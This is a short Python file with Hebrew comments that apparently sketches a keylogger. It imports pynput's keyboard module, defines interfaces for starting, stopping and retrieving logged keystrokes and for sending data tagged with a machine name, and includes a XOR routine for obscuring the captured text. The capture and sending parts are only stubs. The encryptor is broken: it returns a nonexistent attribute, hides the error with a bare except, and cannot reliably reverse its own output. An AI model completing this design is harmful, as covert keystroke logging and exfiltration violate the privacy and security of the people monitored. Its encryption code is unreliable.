from pynput import keyboard
from abc import ABC, abstractmethod
import threading


#מחלקה שמפעילה את התוכנית או מכבה
class IKeyLogger(ABC):
    def __init__(self):
        self.text = []
        
    @abstractmethod
    def start_logging(self):
        pass
                          
    @abstractmethod
    def stop_logging(self):
        pass

    @abstractmethod
    def get_logged_keys(self):
        pass
        



#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str):
        pass

        

#xor מחלקה שמצפינה מילים באמצעות
class Encryptor:
    def encryption_using_xor(self,data,key):
        encrypted_text = ''
        try:
            for i, word in enumerate(data):
                if word == '[' or word == ']':
                    continue
                else:    
                    encrypted_text += chr(ord(word) ^ key * i)
            print (encrypted_text)    
            return self.encrypted_text
        except:
             return encrypted_text
    #דוגמא לשימוש בהצפנה
# a = Encryptor()
# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
# a.encryption_using_xor(b,4)




